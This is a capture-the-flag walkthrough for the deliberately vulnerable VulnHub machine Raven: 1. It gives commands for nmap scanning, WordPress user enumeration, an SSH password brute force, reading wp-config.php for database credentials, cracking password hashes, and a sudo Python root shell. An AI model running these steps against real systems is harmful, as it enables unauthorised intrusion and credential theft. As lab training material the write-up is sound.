# Raven: 1

- **Machine:** Raven: 1
- **Download:** https://www.vulnhub.com/entry/raven-1,256/

![](824-1.png)

---

# Machine Setup

1. Open the downloaded OVA file in VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](824-2.png)

---

## Full Nmap Scan

Perform a complete scan to identify open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.170
```

![](824-3.png)

---

## Optional Port Enumeration

```bash
nmap -v -p- 192.168.2.170
```

```bash
nmap -sC -sV -A 192.168.2.170
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.170
```

![](824-4.png)

---

# Web Enumeration

Visit the discovered web resources.

```text
http://192.168.2.170/
http://192.168.2.170/wordpress/
http://192.168.2.170/wordpress/wp-login.php
http://192.168.2.170/vendor/
```

---

## Configure Local Hostname

Add the target hostname to your hosts file.

```bash
echo "192.168.2.170 raven.local" >> /etc/hosts
```

![](824-5.png)

---

## Enumerate WordPress Users

Use WPScan to discover valid WordPress usernames.

```bash
wpscan --url http://192.168.2.170/wordpress --enumerate u --wp-content-dir wp-content
```

![](824-6.png)

Discovered users:

```text
michael
steven
```

---

# SSH Access

## Password Brute Force

Brute-force the SSH password for the discovered user.

```bash
hydra -l michael -P /opt/rockyou.txt ssh://192.168.2.170
```

![](824-7.png)

---

## Login via SSH

```bash
ssh michael@192.168.2.170
```

![](824-8.png)

---

## Initial Enumeration

Navigate to the web root.

```bash
cd /var/www
```

```bash
ls
```

Read the second flag.

```bash
cat flag2.txt
```

![](824-9.png)

---

## Locate WordPress Configuration

Navigate to the WordPress installation.

```bash
cd /var/www/html/wordpress
```

```bash
ls
```

![](824-10.png)

Read the WordPress configuration file.

```bash
cat wp-config.php
```

![](824-11.png)

Recovered database credentials:

```text
Username : root
Password : R@v3nSecurity
```

---

# MySQL Enumeration

Connect to the MySQL server.

```bash
mysql -u root -pR@v3nSecurity
```

![](824-12.png)

Enumerate the database.

```sql
SHOW DATABASES;
```

```sql
USE wordpress;
```

```sql
SHOW TABLES;
```

Dump the WordPress users table.

```sql
SELECT * FROM wp_users;
```

![](824-13.png)

---

# Password Hash Cracking

Identify the hash type.

```bash
hash-identifier
```

![](824-14.png)

Save the hashes.

```bash
nano hashes.txt
```

![](824-15.png)

Crack the WordPress password hashes.

```bash
john --show --format=phpass hashes.txt
```

![](824-16.png)

Recovered credentials:

```text
Username : steven
Password : pink84
```

---

# User Switching

Switch to the recovered user.

```bash
su steven
```

Password:

```text
pink84
```

![](824-17.png)

---

# Privilege Escalation

Check the user's sudo permissions.

```bash
sudo -l
```

![](824-18.png)

The `steven` user can execute **Python** as **root** without supplying a password.

Spawn a root shell.

```bash
sudo python -c 'import os; os.system("/bin/bash")'
```

![](824-19.png)

---

# Key Learning

- Enumerate WordPress users with **WPScan**.
- Weak SSH passwords may allow direct system access.
- Always inspect `wp-config.php` for database credentials.
- WordPress password hashes can often be cracked offline using **John the Ripper**.
- Reused credentials frequently allow lateral movement between users.
- Misconfigured sudo permissions, especially for scripting languages like Python, can lead directly to root privileges.

---

# Summary

The assessment began with Nmap service enumeration, revealing a WordPress installation. WPScan identified valid usernames, and a weak SSH password allowed access as **michael**. During local enumeration, the WordPress configuration file exposed the MySQL root credentials. After accessing the database, the WordPress user hashes were extracted and cracked, revealing **steven's** password. Switching to the **steven** account uncovered a sudo misconfiguration that permitted Python to execute as root without a password, resulting in full administrative access to the system.